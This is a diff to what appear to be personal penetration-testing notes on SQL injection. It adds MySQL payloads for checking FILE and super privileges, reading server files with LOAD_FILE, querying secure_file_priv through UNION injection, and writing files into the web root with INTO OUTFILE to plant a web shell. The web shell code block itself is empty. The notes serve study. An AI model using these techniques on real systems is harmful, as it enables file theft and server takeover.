@@ -1,5 +1,3 @@
-
-
 ### General Notes
 
 > Unauthorized user take control over SQL statements used by a web application.
@@ -216,14 +214,78 @@ CAST((SELECT x FROM y) AS int)
 > To add them, use this `' || <payload> -- ` or `' UNION <payload> --`.
 
 ---
-### Reading Files
+### Reading From Files
 
+To be able to read data in a database system, we need to first have the `FILE` privilege granted for the user we are currently logged in as.
 
+* To determine the user:
+```SQL
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user FROM mysql.user
+```
+
+* To determine the privileges for the user:
+```SQL
+SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE user='our-user';
+```
+
+* We can also check if we have super privileges:
+```SQL
+SELECT super_priv FROM mysql.user WHERE user='our-user';
+```
+> It will return `Y` indicating yes, meaning we have superuser privileges.
+
+If our user has the `FILE` privilege, we can now load a file's contents and dump it into the database:
+```SQL
+SELECT LOAD_FILE('path/to/file');
+```
+> This can be one of the columns while injecting a query.
 
 ---
-### Writing Files
+### Writing To Files
 
+To be able to write to files is more difficult than reading from files, there needs to be 3 conditions met.
+##### Conditions To Meet
 
+1. We need the user to have the `FILE` privilege.
+2. We also need the [[mysql]] global variable `secure_file_priv` to be disabled or be configured weakly.
+3. We need write access to te location we want to write to, preferrably the root directory of the web server.
+
+This is a global variable that determines where we can read/write to files.
+* If it is empty, we have complete access to the entire file system.
+* If it is set to `NULL`, we have no access to the entire file system.
+* If it is set to a specific directory, then this is the only place we can access.
+
+To see its value: 
+```SQL
+SHOW variables LIKE 'secure_file_priv';
+```
+
+Using `UNION` injection, we can see its value from the `information_schema` database.
+```SQL
+UNION SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
+```
+
+##### Writing Procedure
+
+To write to files, we can use the `INTO OUTFILE` syntax:
+```SQL
+SELECT * FROM table_1 INTO OUTFILE 'path/to/file';
+SELECT 'This is text' INTO OUTFILE 'path/to/file';
+```
+
+The location we want to write to is usually the root directory of the web server. This is to ensure it is executed, and can be reached easily from a browser.
+> To find the root directory:
+* Use the `LOAD_FILE` command to read the server configuration. Its location is dependant on the system.
+* Use fuzzing attack to write files to different web roots, and see which one works:
+	* `/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
+	* `/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`
+
+The file we want to write is usually a [[File Upload#Web Shell]].
+
+```
+```
 
 ---
 ### Different Inputs and Obfuscating Attacks
@@ -260,14 +322,14 @@ This database has metadata information about the tables and databases present on
 
 * To list the databases on the system.
 ```SQL
-SELECT * from information_schema.schemata
+SELECT * from information_schema.schemata;
 ```
 > The elements in this table include:
 * SCHEMA_NAME.
 
 * To list all tables on the system.
 ```SQL
-SELECT * FROM information_schema.tables 
+SELECT * FROM information_schema.tables ;
 ```
 > The elements in this database are: (instead of * you can use any of these)
 * TABLE_NAME
@@ -276,12 +338,22 @@ SELECT * FROM information_schema.tables
 * TABLE_TYPE
 
 * To get the information of a table.
-```
-SELECT * FROM information_schema.columns WHERE table_name= ''
+```SQL
+SELECT * FROM information_schema.columns WHERE table_name= '';
 ```
 > The elements in this database are same as above and: (instead of * you can use any of these)
 * COLUMN_NAME
 * DATA_TYPE
+
+* To get the privilegs for users.
+```SQL
+SELECT grantee, privilege_type FROM information_schema.user_privileges;
+```
+
+* To get the global variables:
+```SQL
+SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='what-we-want';
+```
 
 ##### Using Information_schema Equivalent For Oracle
 
